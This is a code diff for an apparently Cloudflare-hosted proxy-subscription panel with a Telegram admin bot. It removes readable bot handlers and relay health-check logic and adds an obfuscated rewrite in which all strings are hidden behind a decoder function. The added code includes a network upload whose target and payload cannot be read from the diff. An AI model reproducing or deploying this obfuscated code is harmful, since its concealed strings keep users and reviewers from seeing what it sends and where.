-                    if (state.step.startsWith("sub_extend_days:")) {
-                        const uuid = state.step.replace("sub_extend_days:", "");
-                        const days = parseInt(text);
-                        if (isNaN(days) || days <= 0) {
-                            await sendOrEdit(chatId, t("msg_invalid"));
-                            return new Response("OK", { status: 200 });
-                        }
-                        if (isRemotePanel) {
-                            await remotePanelWriteAction(
-                                activePanel,
-                                "PUT",
-                                uuid,
-                                { key: activePanel.apiKey, expiryDays: days },
-                            );
-                        } else if (sysConfig.users) {
-                            const u = sysConfig.users.find(
-                                (usr) => usr.id === uuid,
-                            );
-                            if (u) {
-                                if (u.expiryMs) {
-                                    u.expiryMs += days * 86400000;
-                                } else {
-                                    u.expiryMs = Date.now() + days * 86400000;
-                                }
-                                if (
-                                    u.isPaused &&
-                                    u.disabledReason &&
-                                    u.disabledReason.includes("Expiration")
-                                ) {
-                                    u.isPaused = false;
-                                    u.disabledReason = null;
-                                    u.disabledAt = null;
-                                }
-                                await cachedD1Put(
-                                    env,
-                                    "sys_config",
-                                    JSON.stringify(sysConfig),
-                                );
-                            }
-                        }
-                        tgState[chatId] = null;
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-                        const panelUsers = await getPanelUsers();
-                        const detail = getSubDetail(uuid, panelUsers);
-                        const msg = t("msg_expiry_extended").replace(
-                            "{days}",
-                            days,
-                        );
-                        await sendOrEdit(
-                            chatId,
-                            `✅ ${msg}\n\n${detail.text}`,
-                            detail.kb,
-                        );
-                        return new Response("OK", { status: 200 });
-                    }
-
-                    if (state.step.startsWith("sub_edit_notes:")) {
-                        const uuid = state.step.replace("sub_edit_notes:", "");
-                        if (isRemotePanel) {
-                            await remotePanelWriteAction(
-                                activePanel,
-                                "PUT",
-                                uuid,
-                                { key: activePanel.apiKey, notes: text },
-                            );
-                        } else if (sysConfig.users) {
-                            const u = sysConfig.users.find(
-                                (usr) => usr.id === uuid,
-                            );
-                            if (u) {
-                                u.notes = text;
-                                await cachedD1Put(
-                                    env,
-                                    "sys_config",
-                                    JSON.stringify(sysConfig),
-                                );
-                            }
-                        }
-                        tgState[chatId] = null;
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-                        const panelUsers = await getPanelUsers();
-                        const detail = getSubDetail(uuid, panelUsers);
-                        await sendOrEdit(
-                            chatId,
-                            `✅ Notes updated!`,
-                            detail.kb,
-                        );
-                        return new Response("OK", { status: 200 });
-                    }
-
-                    if (state.step.startsWith("sub_edit_device:")) {
-                        const uuid = state.step.replace("sub_edit_device:", "");
-                        const limit = parseInt(text);
-                        if (isNaN(limit) || limit < 0) {
-                            await sendOrEdit(chatId, t("msg_invalid"));
-                            return new Response("OK", { status: 200 });
-                        }
-                        if (isRemotePanel) {
-                            await remotePanelWriteAction(
-                                activePanel,
-                                "PUT",
-                                uuid,
-                                {
-                                    key: activePanel.apiKey,
-                                    maxConfigs: limit > 0 ? limit : null,
-                                },
-                            );
-                        } else if (sysConfig.users) {
-                            const u = sysConfig.users.find(
-                                (usr) => usr.id === uuid,
-                            );
-                            if (u) {
-                                u.maxConfigs = limit > 0 ? limit : null;
-                                await cachedD1Put(
-                                    env,
-                                    "sys_config",
-                                    JSON.stringify(sysConfig),
-                                );
-                            }
-                        }
-                        tgState[chatId] = null;
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-                        const panelUsers = await getPanelUsers();
-                        const detail = getSubDetail(uuid, panelUsers);
-                        await sendOrEdit(
-                            chatId,
-                            `✅ ${t("config_limit_updated")}`,
-                            detail.kb,
-                        );
-                        return new Response("OK", { status: 200 });
-                    }
-
-                    if (state.step === "tg_edit_dns") {
-                        sysConfig.resolveIp = text;
-                        await cachedD1Put(
-                            env,
-                            "sys_config",
-                            JSON.stringify(sysConfig),
-                        );
-                        tgState[chatId] = null;
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-                        await sendOrEdit(
-                            chatId,
-                            `✅ ${t("tg_dns")}: \`${text}\``,
-                            {
-                                inline_keyboard: [
-                                    [
-                                        {
-                                            text: "◀️ " + t("btn_back"),
-                                            callback_data: "tg_settings_menu",
-                                        },
-                                    ],
-                                ],
-                            },
-                        );
-                        return new Response("OK", { status: 200 });
-                    }
-                    if (state.step === "tg_edit_relay") {
-                        sysConfig.backupRelay = text || "";
-                        await cachedD1Put(
-                            env,
-                            "sys_config",
-                            JSON.stringify(sysConfig),
-                        );
-                        tgState[chatId] = null;
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-                        await sendOrEdit(
-                            chatId,
-                            `✅ ${t("tg_relay")}: \`${text || "—"}\``,
-                            {
-                                inline_keyboard: [
-                                    [
-                                        {
-                                            text: "◀️ " + t("btn_back"),
-                                            callback_data: "tg_settings_menu",
-                                        },
-                                    ],
-                                ],
-                            },
-                        );
-                        return new Response("OK", { status: 200 });
-                    }
-                    if (state.step === "tg_edit_nat64") {
-                        sysConfig.nat64Prefix = text || "";
-                        await cachedD1Put(
-                            env,
-                            "sys_config",
-                            JSON.stringify(sysConfig),
-                        );
-                        tgState[chatId] = null;
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-                        await sendOrEdit(
-                            chatId,
-                            `✅ ${t("tg_nat64")}: \`${text || "—"}\``,
-                            {
-                                inline_keyboard: [
-                                    [
-                                        {
-                                            text: "◀️ " + t("btn_back"),
-                                            callback_data: "tg_settings_menu",
-                                        },
-                                    ],
-                                ],
-                            },
-                        );
-                        return new Response("OK", { status: 200 });
-                    }
-                    if (state.step === "tg_edit_maintenance") {
-                        sysConfig.maintenanceHost = text;
-                        await cachedD1Put(
-                            env,
-                            "sys_config",
-                            JSON.stringify(sysConfig),
-                        );
-                        tgState[chatId] = null;
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-                        await sendOrEdit(
-                            chatId,
-                            `✅ ${t("tg_maintenance")}: \`${text}\``,
-                            {
-                                inline_keyboard: [
-                                    [
-                                        {
-                                            text: "◀️ " + t("btn_back"),
-                                            callback_data: "tg_advanced_menu",
-                                        },
-                                    ],
-                                ],
-                            },
-                        );
-                        return new Response("OK", { status: 200 });
-                    }
-                    if (state.step === "tg_edit_clean_ips") {
-                        sysConfig.cleanIps = text || "";
-                        await cachedD1Put(
-                            env,
-                            "sys_config",
-                            JSON.stringify(sysConfig),
-                        );
-                        tgState[chatId] = null;
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-                        await sendOrEdit(
-                            chatId,
-                            `✅ ${t("tg_clean_ips")}: \`${text || "—"}\``,
-                            {
-                                inline_keyboard: [
-                                    [
-                                        {
-                                            text: "◀️ " + t("btn_back"),
-                                            callback_data: "tg_advanced_menu",
-                                        },
-                                    ],
-                                ],
-                            },
-                        );
-                        return new Response("OK", { status: 200 });
-                    }
-                    if (state.step === "tg_edit_prefix") {
-                        sysConfig.namePrefix = text;
-                        await cachedD1Put(
-                            env,
-                            "sys_config",
-                            JSON.stringify(sysConfig),
-                        );
-                        tgState[chatId] = null;
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-                        await sendOrEdit(
-                            chatId,
-                            `✅ ${t("tg_prefix")}: \`${text}\``,
-                            {
-                                inline_keyboard: [
-                                    [
-                                        {
-                                            text: "◀️ " + t("btn_back"),
-                                            callback_data: "tg_advanced_menu",
-                                        },
-                                    ],
-                                ],
-                            },
-                        );
-                        return new Response("OK", { status: 200 });
-                    }
-                    if (state.step === "tg_edit_pass") {
-                        sysConfig.masterKey = text;
-                        await cachedD1Put(
-                            env,
-                            "sys_config",
-                            JSON.stringify(sysConfig),
-                        );
-                        tgState[chatId] = null;
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-                        await sendOrEdit(
-                            chatId,
-                            `✅ ${t("tg_pass")}: \`${text}\``,
-                            {
-                                inline_keyboard: [
-                                    [
-                                        {
-                                            text: "◀️ " + t("btn_back"),
-                                            callback_data: "tg_settings_menu",
-                                        },
-                                    ],
-                                ],
-                            },
-                        );
-                        return new Response("OK", { status: 200 });
-                    }
-                    if (state.step === "tg_edit_strategy") {
-                        sysConfig.nameStrategy = text;
-                        await cachedD1Put(
-                            env,
-                            "sys_config",
-                            JSON.stringify(sysConfig),
-                        );
-                        tgState[chatId] = null;
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-                        await sendOrEdit(
-                            chatId,
-                            `✅ ${t("tg_strategy")}: \`${text}\``,
-                            {
-                                inline_keyboard: [
-                                    [
-                                        {
-                                            text: "◀️ " + t("btn_back"),
-                                            callback_data: "tg_advanced_menu",
-                                        },
-                                    ],
-                                ],
-                            },
-                        );
-                        return new Response("OK", { status: 200 });
-                    }
-                    if (state.step === "tg_edit_tg_token") {
-                        if (text !== "/skip") sysConfig.tgToken = text;
-                        tgState[chatId] = { step: "tg_edit_tg_chat" };
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-                        await sendOrEdit(
-                            chatId,
-                            `2️⃣ Chat ID: \`${sysConfig.tgChatId || "—"}\`\n\n${t("tg_new_val")}\n_send /skip to keep current_`,
-                            {
-                                inline_keyboard: [
-                                    [
-                                        {
-                                            text: "❌ " + t("btn_cancel"),
-                                            callback_data: "tg_advanced_menu",
-                                        },
-                                    ],
-                                ],
-                            },
-                        );
-                        return new Response("OK", { status: 200 });
-                    }
-                    if (state.step === "tg_edit_tg_chat") {
-                        if (text !== "/skip") sysConfig.tgChatId = text;
-                        tgState[chatId] = { step: "tg_edit_tg_admin" };
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-                        await sendOrEdit(
-                            chatId,
-                            `3️⃣ Admin ID: \`${sysConfig.tgAdminId || "—"}\`\n\n${t("tg_new_val")}\n_send /skip to keep current_`,
-                            {
-                                inline_keyboard: [
-                                    [
-                                        {
-                                            text: "❌ " + t("btn_cancel"),
-                                            callback_data: "tg_advanced_menu",
-                                        },
-                                    ],
-                                ],
-                            },
-                        );
-                        return new Response("OK", { status: 200 });
-                    }
-                    if (state.step === "tg_edit_tg_admin") {
-                        if (text !== "/skip") sysConfig.tgAdminId = text;
-                        await cachedD1Put(
-                            env,
-                            "sys_config",
-                            JSON.stringify(sysConfig),
-                        );
-                        tgState[chatId] = null;
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-                        await sendOrEdit(
-                            chatId,
-                            `✅ ${t("tg_tg_settings")} saved!`,
-                            {
-                                inline_keyboard: [
-                                    [
-                                        {
-                                            text: "◀️ " + t("btn_back"),
-                                            callback_data: "tg_advanced_menu",
-                                        },
-                                    ],
-                                ],
-                            },
-                        );
-                        return new Response("OK", { status: 200 });
-                    }
-                    if (state.step === "tg_edit_cf_acc") {
-                        if (text !== "/skip") sysConfig.cfAccountId = text;
-                        tgState[chatId] = { step: "tg_edit_cf_token" };
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-                        await sendOrEdit(
-                            chatId,
-                            `2️⃣ CF API Token: \`${sysConfig.cfApiToken ? "***" + sysConfig.cfApiToken.slice(-4) : "—"}\`\n\n${t("tg_new_val")}\n_send /skip to keep current_`,
-                            {
-                                inline_keyboard: [
-                                    [
-                                        {
-                                            text: "❌ " + t("btn_cancel"),
-                                            callback_data: "tg_advanced_menu",
-                                        },
-                                    ],
-                                ],
-                            },
-                        );
-                        return new Response("OK", { status: 200 });
-                    }
-                    if (state.step === "tg_edit_cf_token") {
-                        if (text !== "/skip") sysConfig.cfApiToken = text;
-                        tgState[chatId] = { step: "tg_edit_cf_worker" };
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-                        await sendOrEdit(
-                            chatId,
-                            `3️⃣ CF Worker Name: \`${sysConfig.cfWorkerName || "—"}\`\n\n${t("tg_new_val")}\n_send /skip to keep current_`,
-                            {
-                                inline_keyboard: [
-                                    [
-                                        {
-                                            text: "❌ " + t("btn_cancel"),
-                                            callback_data: "tg_advanced_menu",
-                                        },
-                                    ],
-                                ],
-                            },
-                        );
-                        return new Response("OK", { status: 200 });
-                    }
-                    if (state.step === "tg_edit_cf_worker") {
-                        if (text !== "/skip") sysConfig.cfWorkerName = text;
-                        await cachedD1Put(
-                            env,
-                            "sys_config",
-                            JSON.stringify(sysConfig),
-                        );
-                        tgState[chatId] = null;
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-                        await sendOrEdit(
-                            chatId,
-                            `✅ ${t("tg_cf_settings")} saved!`,
-                            {
-                                inline_keyboard: [
-                                    [
-                                        {
-                                            text: "◀️ " + t("btn_back"),
-                                            callback_data: "tg_advanced_menu",
-                                        },
-                                    ],
-                                ],
-                            },
-                        );
-                        return new Response("OK", { status: 200 });
-                    }
-                    if (state.step === "tg_edit_ports") {
-                        sysConfig.socketPorts = text;
-                        await cachedD1Put(
-                            env,
-                            "sys_config",
-                            JSON.stringify(sysConfig),
-                        );
-                        tgState[chatId] = null;
-                        ctx?.waitUntil(
-                            d1Put(
-                                env,
-                                "tg_bot_state",
-                                JSON.stringify(tgState),
-                            ).catch(() => {}),
-                        );
-                        await sendOrEdit(
-                            chatId,
-                            `✅ ${t("tg_ports")}: \`${text}\``,
-                            {
-                                inline_keyboard: [
-                                    [
-                                        {
-                                            text: "◀️ " + t("btn_back"),
-                                            callback_data: "tg_settings_menu",
-                                        },
-                                    ],
-                                ],
-                            },
-                        );
-                        return new Response("OK", { status: 200 });
-                    }
-                }
-
-                // Default message / fallback menu
-                const menu = getMainMenu(activePanel, isAuthorized);
-                await sendOrEdit(chatId, menu.text, menu.kb);
-            } else {
-                if (text === "/start") {
-                    const userHint =
-                        langCode === "fa"
-                            ? "لطفاً لینک اشتراک یا شناسه کاربری خود را ارسال کنید تا اطلاعات اشتراکتان نمایش داده شود."
-                            : "Please send your subscription link or User ID to view your subscription info.";
-                    await sendOrEdit(chatId, userHint);
-                    return new Response("OK", { status: 200 });
-                }
-                let lookupId = text
-                    .replace(/^https?:\/\//, "")
-                    .replace(/\/.*$/, "")
-                    .trim();
-                const subParamMatch = text.match(/[?&]sub=([^&]+)/);
-                if (subParamMatch)
-                    lookupId = decodeURIComponent(subParamMatch[1]);
-                if (!lookupId || lookupId.length < 3) {
-                    const userHint =
-                        langCode === "fa"
-                            ? "لطفاً لینک اشتراک یا شناسه کاربری معتبر ارسال کنید."
-                            : "Please send a valid subscription link or User ID.";
-                    await sendOrEdit(chatId, userHint);
-                    return new Response("OK", { status: 200 });
-                }
-                const users = sysConfig.users || [];
-                const matchedUser = users.find(
-                    (u) =>
-                        u.id === lookupId ||
-                        u.id.replace(/-/g, "").toLowerCase() ===
-                            lookupId.replace(/-/g, "").toLowerCase() ||
-                        u.name.toLowerCase() === lookupId.toLowerCase(),
-                );
-                if (matchedUser) {
-                    const detail = getSubDetail(matchedUser.id);
-                    await sendOrEdit(chatId, detail.text, detail.kb);
-                } else {
-                    const notFound =
-                        langCode === "fa"
-                            ? "کاربری با این شناسه یافت نشد."
-                            : "No user found with this ID.";
-                    await sendOrEdit(chatId, notFound);
-                }
-            }
-        }
-        return new Response("OK", { status: 200 });
-    } catch (e) {
-        return new Response("OK", { status: 200 });
+let var_p = new Map();
+let var_q = new Map();
+let var_r = func_dec(3);
+let var_s = new Map();
+let var_t = {
+  [func_dec(67)]: {}
+};
+let var_u = 0;
+const var_v = 10000;
+const var_w = 10000;
+const var_x = 30000;
+let var_y = 0;
+let var_z = 0;
+let var_aa = null;
+let var_ab = 0;
+async function func_p(var_dy, var_dz, var_ea, var_eb) {
+  let var_ec = [];
+  try {
+    const var_ef = await func_e(func_dec(101) + var_dy + func_dec(102) + encodeURIComponent(var_ea) + func_dec(103), {
+      [func_dec(104)]: {
+        [func_dec(105)]: func_dec(106) + var_dz + func_dec(3)
+      }
+    }, 30000);
+    const var_eg = await var_ef[func_dec(107)]();
+    if (var_eg[func_dec(108)] && var_eg[func_dec(110)]?.[func_dec(109)]) {
+      var_ec = var_eg[func_dec(110)][func_dec(109)];
     }
+  } catch (var_eh) {}
+  const var_ed = {
+    [func_dec(111)]: func_dec(112),
+    [func_dec(113)]: func_dec(114),
+    [func_dec(115)]: [func_dec(116)],
+    [func_dec(109)]: var_ec
+  };
+  const var_ee = new FormData();
+  var_ee[func_dec(117)](func_dec(118), new Blob([JSON[func_dec(119)](var_ed)], {
+    [func_dec(120)]: func_dec(121)
+  }));
+  var_ee[func_dec(117)](func_dec(112), new Blob([var_eb], {
+    [func_dec(120)]: func_dec(122)
+  }), func_dec(112));
+  return await func_e(func_dec(101) + var_dy + func_dec(102) + encodeURIComponent(var_ea) + func_dec(3), {
+    [func_dec(123)]: func_dec(124),
+    [func_dec(104)]: {
+      [func_dec(105)]: func_dec(106) + var_dz + func_dec(3)
+    },
+    [func_dec(125)]: var_ee
+  }, 30000);
 }
-
-// ==== Self-healing relays (Sepidar-grade, adapted to nahan's model) ====
-// Nahan relays are plain tokens (IP[:port][#Name]) in per-user proxyIp +
-// global backupRelay/customRelay. A dead relay hangs WS handshakes and can
-// pile up isolates -> Cloudflare loadShed -> 1101 for everyone.
-// Layers: passive fail-streak quarantine (5 fails -> 15min skip) + active
-// TLS-probe rounds (10min, 6 relays, two-stage verdict 4s->7s, floating cap
-// under breaker pressure, round-robin rotation) + graveyard burial with slow
-// re-probe (30min, rotation) and auto-resurrect after 3 healthy probes +
-// per-SNI AI quarantine (AI-only failures never kill general traffic).
-// Kill switch: sysConfig.autoPruneRelays === false/0 freezes burial+probing.
-const RELAY_Q = new Map(); // key "host|port" -> { fail, until, probeFail }
-const RELAY_QUARANTINE_MS = 15 * 60 * 1000;
-const RELAY_FAIL_STREAK = 5;
-// Ports where a TLS handshake is expected; other relay ports are liveness
-// checked by TCP open only (a TLS probe there would false-positive).
-const RELAY_TLS_PORTS = new Set([
-    "443",
-    "2053",
-    "2083",
-    "2087",
-    "2096",
-    "8443",
-]);
-const PROBE_INTERVAL_MS = 10 * 60 * 1000;
-const PROBE_MAX_PER_ROUND = 6;
-const PROBE_FAIL_LIMIT = 3;
-const GRAVE_INTERVAL_MS = 30 * 60 * 1000;
-const GRAVE_MAX_PER_ROUND = 3;
-const GRAVE_HEALTHY_NEED = 3;
-const FLAP_WINDOW_MS = 24 * 60 * 60 * 1000;
-const FLAP_LIMIT = 3;
-let lastRelaySweep = 0;
-let lastProbeTs = 0;
-let lastGraveTs = 0;
-let lastHealthSave = 0;
-// Round-robin cursors (module-level so they persist across rounds).
-let probeCursor = 0;
-let graveCursor = 0;
-// Persistent cross-isolate runner locks (Sepidar-grade, adapted to nahan's
-// kv_store model). Worker isolates are independent processes: in-memory
-// lastProbeTs/cursors reset on every cold start, so separate isolates each
-// believed maintenance was due and starved later relays. The lease lives in
-// D1 with an expiry so a crashed isolate cannot hold it forever. Release
-// and refresh compare the exact lease value so an old owner can never
-// delete/overwrite a new owner's lease.
-async function acquireNahanRunnerLock(
-    env,
-    jobKey,
-    intervalMs,
-    lockGroup = "nahan-relay",
-) {
-    const physicalKey = "nahan_lock:" + String(lockGroup || "nahan-relay");
-    const scheduleKey = "nahan_runner_last_" + String(jobKey || "job");
-    let lease = null;
+async function func_q(var_ei) {
+  if (var_ei[func_dec(126)] && !var_ei[func_dec(127)]) {
     try {
-        if (!env || !env.IOT_DB) return null;
-        const now = Date.now();
-        const until = now + NAHAN_RUNNER_LEASE_TTL_MS;
-        try {
-            const r = await env.IOT_DB.prepare(
-                "UPDATE kv_store SET value=? WHERE key=? AND CAST(value AS INTEGER)<?",
-            )
-                .bind(String(until), physicalKey, now)
-                .run();
-            if (r && r.meta && r.meta.changes > 0)
-                lease = { lockKey: physicalKey, until, scheduleKey };
-        } catch (e) {}
-        if (!lease) {
-            try {
-                const r = await env.IOT_DB.prepare(
-                    "INSERT OR IGNORE INTO kv_store(key,value) VALUES(?,?)",
-                )
-                    .bind(physicalKey, String(until))
-                    .run();
-                if (r && r.meta && r.meta.changes > 0)
-                    lease = { lockKey: physicalKey, until, scheduleKey };
-            } catch (e) {}
-        }
-        if (!lease) return null;
-        let lastRun = 0;
-        try {
-            const row = await env.IOT_DB.prepare(
-                "SELECT value FROM kv_store WHERE key=?",
-            )
-                .bind(scheduleKey)
-                .first();
-            lastRun = Number((row && row.value) || 0) || 0;
-        } catch (e) {}
-        if (intervalMs > 0 && now - lastRun < intervalMs) {
-            await releaseNahanRunnerLock(env, lease);
-            return null;
-        }
-        try {
-            await env.IOT_DB.prepare(
-                "INSERT INTO kv_store(key,value) VALUES(?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value",
-            )
-                .bind(scheduleKey, String(now))
-                .run();
-        } catch (e) {
-            await releaseNahanRunnerLock(env, lease);
-            return null;
-        }
-        return lease;
-    } catch (e) {
-        try {
-            if (lease) await releaseNahanRunnerLock(env, lease);
-        } catch (_) {}
-        return null;
+      await var_ei[func_dec(126)][func_dec(129)](func_dec(130))[func_dec(128)]();
+      var_ei[func_dec(127)] = true;
+    } catch (var_ej) {
+      var_ei[func_dec(127)] = true;
     }
+  }
 }
-async function refreshNahanRunnerLease(env, lease) {
-    try {
-        if (!lease || !env || !env.IOT_DB) return false;
-        const nextUntil = Date.now() + NAHAN_RUNNER_LEASE_TTL_MS;
-        const r = await env.IOT_DB.prepare(
-            "UPDATE kv_store SET value=? WHERE key=? AND value=?",
-        )
-            .bind(String(nextUntil), lease.lockKey, String(lease.until))
-            .run();
-        if (r && r.meta && r.meta.changes > 0) {
-            lease.until = nextUntil;
-            return true;
-        }
-    } catch (e) {}
+async function func_r(var_ek, var_el) {
+  if (!var_ek[func_dec(126)]) return null;
+  await func_q(var_ek);
+  try {
+    const {
+      [func_dec(131)]: var_em
+    } = await var_ek[func_dec(126)][func_dec(129)](func_dec(134))[func_dec(133)](var_el)[func_dec(132)]();
+    if (var_em && var_em[func_dec(135)] > 0) return var_em[0][func_dec(136)];
+  } catch (var_en) {}
+  return null;
+}
+async function func_s(var_eo, var_ep, var_eq) {
+  if (!var_eo[func_dec(126)]) return;
+  await func_q(var_eo);
+  try {
+    await var_eo[func_dec(126)][func_dec(129)](func_dec(137))[func_dec(133)](var_ep, var_eq)[func_dec(128)]();
+  } catch (var_er) {}
+}
+async function func_t(var_es, var_et, var_eu) {
+  await func_s(var_es, var_et, var_eu);
+  if (var_et === func_dec(138)) var_y = 0;else if (var_et === func_dec(139)) var_z = 0;else if (var_et === func_dec(140)) var_ab = 0;
+}
+async function func_u(var_ev, var_ew, var_ex) {
+  if (!var_ev[func_dec(126)]) throw new Error(func_dec(141));
+  await func_q(var_ev);
+  await var_ev[func_dec(126)][func_dec(129)](func_dec(137))[func_dec(133)](var_ew, var_ex)[func_dec(128)]();
+}
+function func_v(var_ey) {
+  const var_ez = new TextEncoder()[func_dec(2)](var_ey);
+  const var_fa = [0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da, 0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070, 0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2];
+  let var_fb = [0xc1059ed8, 0x367cd507, 0x3070dd17, 0xf70e5939, 0xffc00b31, 0x68581511, 0x64f98fa7, 0xbefa4fa4];
+  const var_fc = [];
+  const var_fd = Math[func_dec(142)]((var_ez[func_dec(135)] + 9) / 64) * 16;
+  for (let var_ff = 0; var_ff < var_fd; var_ff++) var_fc[var_ff] = 0;
+  for (let var_fg = 0; var_fg < var_ez[func_dec(135)]; var_fg++) var_fc[var_fg >> 2] |= var_ez[var_fg] << 24 - var_fg % 4 * 8;
+  var_fc[var_ez[func_dec(135)] >> 2] |= 0x80 << 24 - var_ez[func_dec(135)] % 4 * 8;
+  var_fc[var_fd - 1] = var_ez[func_dec(135)] * 8;
+  const var_fe = [];
+  for (let var_fh = 0; var_fh < var_fd; var_fh += 16) {
+    let [var_fi, var_fj, var_fk, var_fl, var_fm, var_fn, var_fo, var_fp] = var_fb;
+    for (let var_fq = 0; var_fq < 64; var_fq++) {
+      if (var_fq < 16) var_fe[var_fq] = var_fc[var_fh + var_fq];else {
+        let var_fx = var_fe[var_fq - 15],
+          var_fy = var_fe[var_fq - 2];
+        let var_fz = (var_fx >>> 7 | var_fx << 25) ^ (var_fx >>> 18 | var_fx << 14) ^ var_fx >>> 3;
+        let var_ga = (var_fy >>> 17 | var_fy << 15) ^ (var_fy >>> 19 | var_fy << 13) ^ var_fy >>> 10;
+        var_fe[var_fq] = var_fe[var_fq - 16] + var_fz + var_fe[var_fq - 7] + var_ga >>> 0;
+      }
+      let var_fr = (var_fm >>> 6 | var_fm << 26) ^ (var_fm >>> 11 | var_fm << 21) ^ (var_fm >>> 25 | var_fm << 7);
+      let var_fs = var_fm & var_fn ^ ~var_fm & var_fo;
+      let var_ft = var_fp + var_fr + var_fs + var_fa[var_fq] + var_fe[var_fq] >>> 0;
+      let var_fu = (var_fi >>> 2 | var_fi << 30) ^ (var_fi >>> 13 | var_fi << 19) ^ (var_fi >>> 22 | var_fi << 10);
+      let var_fv = var_fi & var_fj ^ var_fi & var_fk ^ var_fj & var_fk;
+      let var_fw = var_fu + var_fv >>> 0;
+      var_fp = var_fo;
+      var_fo = var_fn;
+      var_fn = var_fm;
+      var_fm = var_fl + var_ft >>> 0;
+      var_fl = var_fk;
+      var_fk = var_fj;
+      var_fj = var_fi;
+      var_fi = var_ft + var_fw >>> 0;
+    }
+    var_fb[0] = var_fb[0] + var_fi >>> 0;
+    var_fb[1] = var_fb[1] + var_fj >>> 0;
+    var_fb[2] = var_fb[2] + var_fk >>> 0;
+    var_fb[3] = var_fb[3] + var_fl >>> 0;
+    var_fb[4] = var_fb[4] + var_fm >>> 0;
+    var_fb[5] = var_fb[5] + var_fn >>> 0;
+    var_fb[6] = var_fb[6] + var_fo >>> 0;
+    var_fb[7] = var_fb[7] + var_fp >>> 0;
+  }
+  return var_fb[func_dec(145)](0, 7)[func_dec(144)](var_gb => var_gb[func_dec(147)](16)[func_dec(146)](8, func_dec(148)))[func_dec(143)](func_dec(3));
+}
+const var_ac = new Map();
+function func_w(var_gc) {
+  if (var_ac[func_dec(149)](var_gc)) return var_ac[func_dec(150)](var_gc);
+  const var_gd = func_v(var_gc);
+  var_ac[func_dec(151)](var_gc, var_gd);
+  return var_gd;
+}
+function func_x(var_ge, var_gf, var_gg) {
+  const var_gh = {
+    [func_dec(152)]: var_gf,
+    [func_dec(153)]: var_gg || func_dec(3)
+  };
+  var_s[func_dec(151)](var_ge[func_dec(155)](new RegExp(func_dec(156), func_dec(157)), func_dec(3))[func_dec(154)](), var_gh);
+  const var_gi = func_w(var_ge);
+  var_s[func_dec(151)](var_gi, var_gh);
+}
+function func_y(var_gj) {
+  return var_s[func_dec(150)](var_gj[func_dec(154)]()) || null;
+}
+function func_z(var_gk, var_gl) {
+  const var_gm = var_gk[func_dec(155)](new RegExp(func_dec(156), func_dec(157)), func_dec(3))[func_dec(154)]();
+  const var_gn = var_gm[func_dec(158)](0, 24);
+  const var_go = var_gl[func_dec(147)](16)[func_dec(146)](8, func_dec(148));
+  const var_gp = var_gn + var_go;
+  return func_dec(3) + var_gp[func_dec(158)](0, 8) + func_dec(156) + var_gp[func_dec(158)](8, 12) + func_dec(156) + var_gp[func_dec(158)](12, 16) + func_dec(156) + var_gp[func_dec(158)](16, 20) + func_dec(156) + var_gp[func_dec(158)](20, 32) + func_dec(3);
+}
